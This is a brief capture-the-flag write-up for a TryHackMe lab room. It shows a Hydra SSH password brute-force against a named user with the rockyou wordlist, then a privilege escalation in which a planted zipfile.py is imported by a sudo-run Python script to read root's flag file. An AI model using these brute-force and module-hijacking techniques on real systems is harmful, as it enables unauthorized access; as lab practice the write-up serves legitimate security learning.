#hydra #ssh 

https://tryhackme.com/r/room/bsidesgtlibrary

---
#### Nmap
![[Screenshot_2024-05-14_09-45-07.png]]

The `robots.txt` contains
```
User-agent: rockyou 
Disallow: /
```

I will try to bruteforce `meliodas@10.10.96.8`

```shell
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.96.8 ssh -t 10
```

![[Screenshot_2024-05-14_13-17-28.png]]

![[Screenshot_2024-05-14_16-59-08.png]]

![[Screenshot_2024-05-14_16-59-53.png]]

So I've just had to do a custom `zipfile.py` python file next to `bak.py` to be imported instead of the legit one

Custom `zipfile.py` :
```python
import subprocess

subprocess.run(['cat','/root/root.txt'], stdout=open("file","w"))
```
And I've got the flag with 
```shell
sudo /usr/bin/python3.5 /home/meliodas/bak.py
```
